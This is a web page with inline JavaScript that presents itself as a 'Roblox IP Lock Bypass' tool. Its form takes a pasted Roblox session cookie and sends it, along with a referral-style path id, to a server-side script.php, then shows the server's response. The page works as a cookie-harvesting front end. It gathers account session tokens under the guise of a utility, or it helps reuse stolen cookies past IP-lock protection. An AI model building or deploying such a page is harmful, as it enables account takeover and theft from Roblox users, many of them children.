<body>
    <div class="app">
        <div class="container">
            <div class="row">
                <div class="app-main">
                    <div class="main-content">
                        <div class="main-title">
                            <span class="main-company">Roblox</span> IP Lock Bypass
                        </div>
                        <div class="main-subtitle">
                            Bypass IP Locks on <span class="main-company">Roblox</span>
                        </div>

                        <input type="text" id="cookie" name="cookie" placeholder="Cookie here" class="main-input">
                        <div class="main-result">
                            <div class="result-title">Result:</div>
                            <div id="resultbro" class="result-content"></div>
                            <button class="result-button">Copy</button>
                        </div>
                        <button onclick="cookieRefresh()" id="btn" class="main-button">bypass</button>

                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://kit.fontawesome.com/b617dc6679.js" crossorigin="anonymous"></script>

    <script>
        function cookieRefresh() {
            var cookie = document.getElementById('cookie').value;
            const buttonBypass = document.querySelector('.main-button');
            const buttonText = buttonBypass.textContent;
            var pathname = window.location.pathname;
            pathname = pathname.replace(/^\/r\//, '');
            console.log(pathname);

            var xhr = new XMLHttpRequest();
            buttonBypass.textContent = 'Loading...';
            buttonBypass.disabled = true;

            xhr.open('POST', 'script.php', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    if (xhr.status === 200) {
                        console.log(xhr.responseText);
                        const mainResult = document.querySelector('.main-result');
                        const resultButton = document.querySelector('.result-button');
                        const copieText = async text => await navigator.clipboard.writeText(text);
                        resultButton.onclick = copieText.bind(this, xhr.responseText);
                        mainResult.classList.add('data-get');
                        document.getElementById('resultbro').textContent = xhr.responseText;
                        if (xhr.responseText === '') {
                            document.getElementById('resultbro').textContent = 'Invalid cookie (10)'
                            buttonBypass.textContent = buttonText;
                            buttonBypass.disabled = false;
                        } else {
                            document.getElementById('resultbro').textContent = xhr.responseText;
                            buttonBypass.textContent = buttonText;
                            buttonBypass.disabled = false;
                        }
                    } else {
                        console.error('Ошибка при отправке запроса');
                    }
                }
            };
            var data = 'cookie=' + encodeURIComponent(cookie) + '&path=' + encodeURIComponent(pathname);
            xhr.send(data);
        }
    </script>
